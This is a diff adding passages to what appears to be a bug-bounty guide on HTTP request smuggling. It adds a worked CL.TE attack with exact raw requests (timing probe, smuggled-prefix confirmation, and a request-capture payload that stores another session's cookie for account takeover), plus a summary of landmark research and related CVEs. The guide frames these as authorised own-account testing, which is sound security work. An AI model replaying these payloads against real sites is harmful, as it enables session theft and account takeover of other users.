@@ -340,6 +340,75 @@ Pause-based desync (browser-powered, Kettle 2024): induce a desync by PAUSING mi
 ```
 > **If this → then that:** your follow-up reliably receives the response meant for your **smuggled prefix** → the desync is **confirmed and controllable**. Now choose the exploit by what the target offers: a reflection endpoint → request capture (§9); a WAF/blocked path → control bypass (§10); a cache → poisoning (§11).
 
+## 8.1 Worked example — a complete CL.TE → request-capture attack (full transcript)
+
+> **In plain words:** §§4–13 tell you *what* each step is; this shows the *exact bytes on the wire*, in order, so you can recognise every stage on a real target. Read it as one continuous session: a **safe timing probe** → a **deterministic confirmation on your own connection** → the **crown-jewel exploit** (capturing another session's request), all with the do-no-harm discipline baked in. `\r\n` = a literal CRLF; the lengths are exact and matter.
+
+**Target:** `https://shop.example.com/` — a Cloudflare-style front-end in front of an origin app. Recon found `/feedback` **stores the raw POST body** and shows it back on `/feedback/list`. Goal: prove we can capture another user's request (their session cookie) via a **CL.TE** desync — using our *own* second session as the "victim".
+
+**STEP 0 — SAFE timing detection (§4).** Send the CL.TE timing probe on a fresh connection. Nothing is left dangling — a disagreeing back-end just *waits*.
+```http
+POST / HTTP/1.1\r\n
+Host: shop.example.com\r\n
+Transfer-Encoding: chunked\r\n
+Content-Length: 4\r\n
+\r\n
+1\r\n
+A\r\n
+X                       ← incomplete chunk: a TE back-end waits for more chunks
+```
+- **Observed:** baseline `GET /` returns in ~40 ms; this probe **hangs ~10 s then times out**, repeatably (5/5 tries). → The **front-end honored `Content-Length: 4`** (forwarded 4 bytes and considered us done) while the **back-end honored `Transfer-Encoding`** and sat waiting for the next chunk that never came. That delay = a **CL.TE** signal. No prefix was left on the shared socket, so no real user was touched.
+
+**STEP 1 — deterministic confirmation on OUR OWN connection (§8).** Smuggle a prefix that requests a **unique** path with a distinctive response, then send our *own* benign follow-up on the same connection.
+```http
+POST / HTTP/1.1\r\n
+Host: shop.example.com\r\n
+Content-Length: 43\r\n            ← front-end forwards 43 bytes (the whole thing below)
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n                             ← back-end (chunked) sees "0" = body done, STOPS here…
+\r\n
+GET /smuggle-7f3a9 HTTP/1.1\r\n   ← …so THIS is left as the start of the next request on the socket
+X-Ignore: x
+```
+Then immediately, **our own** follow-up on the same connection:
+```http
+GET / HTTP/1.1\r\n
+Host: shop.example.com\r\n
+\r\n
+```
+- **Observed:** our innocent `GET /` comes back as **`HTTP/1.1 404 Not Found`** for **`/smuggle-7f3a9`** — a path we only ever named *inside the smuggled prefix*. That proves our leftover bytes prefixed the next request on the connection. Repeated 5×, it lands 5×. → **Desync confirmed, deterministic, controllable** — and we proved it against *our own* follow-up, never a stranger's.
+
+**STEP 2 — the exploit: capture a request (§9), proven with our OWN second session.** Now aim the smuggled prefix at the **storing** endpoint `/feedback`, and declare a **body longer than we send** so the back-end keeps reading — swallowing whatever request arrives next on the socket.
+```http
+POST / HTTP/1.1\r\n
+Host: shop.example.com\r\n
+Content-Length: 292\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+POST /feedback HTTP/1.1\r\n
+Host: shop.example.com\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 400\r\n          ← deliberately TOO BIG: the back-end waits, then grabs the NEXT request as body
+\r\n
+comment=
+```
+- We then drive our **second** browser session (call it "victim-B", our own test account) to make any normal request to the site. Because B's request lands next on that back-end socket, it is **appended into the `comment=` body** and stored.
+- **Observed** on `/feedback/list`:
+  ```
+  comment=POST /account HTTP/1.1
+  Host: shop.example.com
+  Cookie: session=B_2f9c7a51e0b4...      ← victim-B's SESSION COOKIE, captured in our stored feedback
+  ...
+  ```
+  → We captured session-B's request **including its `Cookie` header**. Pasting that cookie into a fresh browser logs us in as B → **account takeover**. On a live site the "next request" would be a *real* user's — hence Critical, cross-user.
+
+**STEP 3 — STOP and report (do no harm, §18).** Both "attacker" and "victim-B" were **our own** sessions; we captured **one** benign proof and stopped. We did **not** run the smuggle in a loop, never harvested a real user, and left no dangling prefix. Report title: *"HTTP request smuggling (CL.TE) on shop.example.com → capture of another user's request/session cookie → ATO."* Attach the three transcripts (timing delay → unique-404 differential → own-session cookie capture). That sequence **is** the finding — a bare timing blip would not be.
+
+> **Read the pattern, not just the bytes:** every worked exploit in Part III is this same shape — *safe timing signal → deterministic differential on your own connection → aim the prefix at the highest-impact sink the target offers (store/reflect, `/admin`, the cache) → one benign proof → stop.* Swap the CL.TE framing for H2.CL/CL.0 and the `/feedback` sink for `/admin` or a cache, and you have every other exploit in this guide.
+
 ---
 
 # PART III — EXPLOITATION BY IMPACT (where the money is)
@@ -417,6 +486,26 @@ The control-bypass (§10) often lands you at back-end endpoints that are themsel
 □ Request-hijack an ADMIN's session (§9) → use admin functionality → code execution. CRITICAL
 ```
 > **The smuggling→RCE rule:** smuggling is "only" a desync until the **endpoint you newly reach** (or the **session you hijack**) grants code execution. Always ask "**what does the back-end let me do now that the front-end can't stop?**" — a reachable internal admin (→ code-exec feature), a back-end SSRF to metadata (→ cloud shell), or a WAF-bypassed injection (→ RCE) turns a desync into a **Critical RCE chain**. Prove the shell on your own tenant/account, validate creds read-only, and stop (§18).
+
+---
+
+# 13.1 Real-world smuggling — the cases that defined the class
+
+Smuggling is a **research-driven** class: the techniques in this guide came from a small set of landmark writeups, each of which was proven against real, high-value targets. Knowing them tells you *which vector to reach for* and is a common interview check.
+
+**"HTTP Desync Attacks: Request Smuggling Reborn" (James Kettle, 2019)** revived the class (it had been near-dormant since Watchfire's 2005 paper). The headline demonstration was a **CL.TE desync on PayPal's login page**: a smuggled prefix could **capture the login request of the next user** — credentials and session — the exact §9 request-capture chain, on a top-tier target, for a large bounty. The lesson that still holds: the crown jewel is **capturing another user's auth**, and it lives wherever a chained front-end/back-end disagree on framing.
+
+**"HTTP/2: The Sequel is Always Worse" (Kettle, 2021)** showed that HTTP/2 did **not** end smuggling — it moved it to the **H2→H1 downgrade** (§7). Demonstrations included **H2 desync against Netflix** (via an edge appliance that downgraded to HTTP/1.1) and multiple CDN/appliance stacks, using **H2.CL / H2.TE / CRLF-in-header-value** injection. The takeaway baked into §7: whenever the edge speaks HTTP/2 to you, **test the downgrade even if classic HTTP/1.1 smuggling failed** — "patched" sites fall here constantly.
+
+**"Browser-Powered Desync Attacks" (Kettle, 2022)** introduced **CL.0** and **client-side desync** (§7.2) — a desync triggered by the **victim's own browser** with no proxy in the path, demonstrated against large sites (including an **Amazon** client-side desync) and delivered like a drive-by. It reframed smuggling from "attacker in the request path" to "attacker gets the victim to visit a page," widening the class to single-server targets.
+
+**Notable CVEs** (match your chain, reproduce SAFELY):
+- **CVE-2019-20372** — nginx `error_page` request smuggling.
+- **CVE-2019-18277** — HAProxy request smuggling.
+- **CVE-2021-33193** — Apache HTTP Server HTTP/2 (`h2`/`mod_proxy`) request splitting/smuggling.
+- The broad, recurring pattern: any **CDN/appliance ↔ origin** pair (Cloudflare/Akamai/Fastly/CloudFront/ALB/HAProxy/nginx in front of an origin) whose parsers disagree — the bug is in the **mismatch**, not one product.
+
+> **Takeaway for your testing:** the money vectors haven't changed — **CL.TE/TE.CL request-capture** (2019), the **H2 downgrade** on modern edges (2021), and **CL.0 / client-side desync** on single servers (2022). Detect safely (§4), confirm deterministically (§8), and aim the prefix at auth capture, a WAF/`/admin` bypass, or the cache (§9–§13) — the same chains these landmark reports used.
 
 ---
 
